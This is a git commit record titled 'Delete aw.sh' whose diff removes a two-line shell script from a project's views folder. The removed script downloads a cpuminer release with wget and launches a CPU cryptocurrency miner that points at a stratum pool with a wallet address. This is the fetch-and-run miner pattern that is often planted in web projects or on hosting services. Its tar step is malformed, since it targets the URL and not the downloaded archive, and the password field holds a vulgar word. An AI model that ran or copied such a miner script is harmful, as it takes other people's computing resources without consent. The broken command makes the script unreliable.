ce81339b2ef7ae01c4b4880eb765d494b732bf59
gunturyogatama404 <99540625+gunturyogatama404@users.noreply.github.com>
2022-02-28 08:33:48 -0400

    Delete aw.sh

--- views/aw.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/bash
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xvf https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a phichox  -o stratum+tcps://stratum-na.rplant.xyz:17031 -u 5k79hkxcQ7axQGBgKjLTdeAQvEA9iPCNv8.BAKULKULI -p webpassword=kontol
